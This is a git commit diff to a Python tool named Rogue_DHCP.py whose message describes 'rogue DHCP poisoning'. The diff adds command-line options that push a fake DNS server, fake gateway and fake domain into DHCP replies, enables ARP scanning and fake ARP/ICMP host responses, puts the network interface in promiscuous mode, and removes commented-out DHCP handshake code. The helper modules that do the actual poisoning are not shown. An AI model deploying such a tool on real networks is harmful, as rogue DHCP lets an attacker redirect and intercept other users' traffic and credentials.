fe9895f6d2a5c41a3b4558134b80b7fe86b42142
Ixod3 <morgansoulard28@gmail.com>
2024-03-01 01:28:28 +0100

    add many argparse parameters for rogue DHCP poisoning

--- Rogue_DHCP.py
+++ Rogue_DHCP.py
@@ -29,60 +29,27 @@ White = "\033[0m"
 
 # Parse command
 parser = argparse.ArgumentParser()
-parser.add_argument("-i","--interface", required=True, help="Interface network")
-parser.add_argument("-ns","--noscan", action='store_true', help="Disable ARP Scan")
+parser.add_argument("-I","--interface", required=True, help="Interface network")
+parser.add_argument("-PR","--ping_arp", action='store_true', help="enable ARP Scan")
+parser.add_argument("-FH","--fake_host", action='store_true', help="enable FakeHost (ARP/ICMP response)")
+parser.add_argument("-N","--nameserver", action='store', help="Include fake DNS server inside DHCP configuration")
+parser.add_argument("-G","--gateway", action='store', help="Include fake gateway inside DHCP configuration")
+parser.add_argument("-D","--domain", action='store', help="Include fake domain inside DHCP configuration")
 args = parser.parse_args()
 
 # Enable promisc mode 
 fct_interface.set_promiscuous(args.interface)
 
 # scan ARP
-if (args.noscan):
+if (args.ping_arp):
+    own_ip, network_id, host_number = fct_interface.get_informations(args.interface)
+    free_ip, occuped_ip = fct_arp.scan(network_id, host_number, args.interface)
+else:
     own_ip, network_id, host_number = fct_interface.get_informations(args.interface)
     free_ip = []
     occuped_ip = []
     for i in range(host_number):
         free_ip.append(f"{network_id}{i+1}")
-else:
-    own_ip, network_id, host_number = fct_interface.get_informations(args.interface)
-    free_ip, occuped_ip = fct_arp.scan(network_id, host_number, args.interface)
 
 # listener
-fct_listener.listener(free_ip, occuped_ip, args.interface)
-
-## Enable promisc mode 
-#hostname = fct_random.hostname()
-## Get random transaction ID
-#xid = fct_random.transaction_id()
-#
-## Listener discover start
-#sniff_packet = fct_scapy.listener_start(random_mac)
-## DHCP Discover
-#fct_dhcp.discover(random_mac, hostname, xid, args.interface)
-## Listener discover join
-#dhcp_offer = fct_scapy.listener_join(sniff_packet)
-#print (f"{Green}[+]{White} Capture - DHCP Offer")
-## Get DHCP offer information
-#dst_mac, offer_ip = fct_dhcp.get_offer_information(dhcp_offer)
-#
-## Listener request start
-#sniff_packet = fct_scapy.listener_start(dst_mac)
-## DHCP request
-#fct_dhcp.request(dst_mac, offer_ip, hostname, xid, args.interface)
-## Listener request join
-#dhcp_ack = fct_scapy.listener_join(sniff_packet)
-#print (f"{Green}[+]{White} Capture - DHCP ACK")
-## Get DHCP ACK information
-#dst_mac, ack_ip = fct_dhcp.get_ack_information(dhcp_ack)
-
-## Fake host Thread
-#threads = []
-#for i in range(1):
-#    thread = threading.Thread(target=fct_thread.fake_host, args=(i, fct_random.valid_mac(), args.interface))
-#    threads.append(thread)
-## Start threads
-#for thread in threads:
-#    thread.start()
-## Wait all thread
-#for thread in threads:
-#    thread.join()
+fct_listener.listener(free_ip, occuped_ip, args)
